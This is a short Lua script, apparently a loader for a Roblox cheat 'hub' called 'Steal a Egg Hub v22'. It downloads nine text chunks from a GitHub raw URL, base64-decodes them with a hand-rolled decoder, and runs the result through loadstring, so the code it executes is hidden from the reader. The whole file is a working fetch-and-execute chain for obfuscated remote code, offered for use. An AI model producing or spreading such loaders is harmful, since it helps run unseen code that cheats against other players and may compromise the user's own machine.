-- [[ STEAL A EGG HUB v22 ]] --
local BASE="https://raw.githubusercontent.com/tsddev016/Steal-a-Egg-Hub/main/"
local b=""
for i=0,8 do b=b..game:HttpGet(BASE.."c"..i..".txt") end
local A="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local function dec(data)
 data=data:gsub("[^"..A.."=]","")
 return (data:gsub(".",function(x)
  if x=="=" then return "" end
  local r,f="",(A:find(x)-1)
  for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and "1" or "0") end
  return r
 end):gsub("%d%d%d?%d?%d?%d?%d?%d?",function(x)
  if #x~=8 then return "" end
  local c=0 for i=1,8 do c=c+(x:sub(i,i)=="1" and 2^(8-i) or 0) end
  return string.char(c)
 end))
end
local fn,err=loadstring(dec(b))
if not fn then warn("[v22]",err) else fn() print("[v22] OK") end
